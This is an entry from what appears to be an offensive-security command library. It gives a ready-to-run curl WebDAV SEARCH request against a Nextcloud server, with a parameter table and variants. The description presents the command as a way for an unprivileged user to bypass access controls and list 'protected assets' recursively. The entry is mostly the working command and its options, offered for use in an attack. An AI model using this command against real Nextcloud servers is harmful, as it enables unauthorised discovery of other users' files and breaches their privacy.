---
id: cmd-uuid-1
data: >-
  curl -u user https://example.com/remote.php/dav/files/user/ -X SEARCH -H
  "Content-Type: text/xml" --data "<?xml version=\"1.0\"?><d:searchrequest
  xmlns:d=\"DAV:\"
  xmlns:oc=\"http://owncloud.org/ns\"><d:basicsearch><d:select><d:prop><oc:fileid/><oc:size/><oc:mimetype/><d:displayname/><d:getcontenttype/></d:prop></d:select><d:from><d:scope><d:href>/</d:href><d:depth>infinity</d:depth></d:scope></d:from><d:where><d:like><d:prop><d:displayname/></d:prop><d:literal>*</d:literal></d:like></d:where><d:orderby><d:prop><d:displayname/></d:prop></d:orderby></d:basicsearch></d:searchrequest>"
  -o data.xml
tags:
  - webdav
  - discovery
type: command
output: XML file listing files recursively
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.694Z'
verified: false
validated: true
submitted: true
---
# webdav-search-curl

## Command

```bash
curl -u user https://example.com/remote.php/dav/files/user/ -X SEARCH -H "Content-Type: text/xml" --data "<?xml version=\"1.0\"?><d:searchrequest xmlns:d=\"DAV:\" xmlns:oc=\"http://owncloud.org/ns\"><d:basicsearch><d:select><d:prop><oc:fileid/><oc:size/><oc:mimetype/><d:displayname/><d:getcontenttype/></d:prop></d:select><d:from><d:scope><d:href>/</d:href><d:depth>infinity</d:depth></d:scope></d:from><d:where><d:like><d:prop><d:displayname/></d:prop><d:literal>*</d:literal></d:like></d:where><d:orderby><d:prop><d:displayname/></d:prop></d:orderby></d:basicsearch></d:searchrequest>" -o data.xml
```

## Description

This command performs a recursive WebDAV SEARCH on Nextcloud to list all shared files with details like paths, sizes, and MIME types, bypassing access controls as an unprivileged user. Use after sharing a folder to discover protected assets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Username for basic auth (e.g., unprivileged user) | Yes |
| URL | Nextcloud WebDAV base (e.g., https://example.com/remote.php/dav/files/user/) | Yes |
| `-X SEARCH` | HTTP method for WebDAV search | Yes |
| `-H "Content-Type: text/xml"` | Sets XML payload type | Yes |
| `--data` | XML query for basic search with infinite depth and * wildcard | Yes |
| `-o data.xml` | Output file for XML response | Yes |

## Examples

### Basic Usage

```bash
curl -u user https://example.com/remote.php/dav/files/user/ -X SEARCH -H "Content-Type: text/xml" --data "[XML payload]" -o data.xml
```

### Advanced Usage

Adjust <d:depth> to '1' for non-recursive, or add more <d:prop> for additional metadata.

```bash
curl -u user https://example.com/remote.php/dav/files/user/ -X SEARCH -H "Content-Type: text/xml" --data "[modified XML]" -o data.xml
```

## Expected Output

XML response (data.xml) with <d:multistatus><d:response> elements for each file, including <d:href> paths, <oc:mimetype> types, and <oc:size> sizes, revealing protected files recursively.

## Related

- [[Related Procedure: Perform-WebDAV-Search-to-List-Files]]
